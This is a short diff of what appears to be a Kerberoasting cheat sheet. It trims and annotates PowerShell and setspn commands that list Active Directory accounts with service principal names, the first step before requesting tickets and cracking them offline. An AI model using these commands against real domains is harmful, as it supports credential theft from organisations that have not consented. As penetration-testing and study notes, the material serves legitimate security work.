@@ -9,12 +9,8 @@ Send a request to a TGT for a Kerberos token, dump it from memory, crack it loca
 Vulnerable users in domain
 
 ```
-Get-NetUser -SPN | select serviceprincipalname    
-
-get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
-get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname
-
-setspn -T <domain> -Q */*
+Get-NetUser -SPN | select serviceprincipalname    //Powerview
+setspn -T <domain> -Q */*                         //Builtin
 ```
 
 Enumerate with LDAP Powershell module
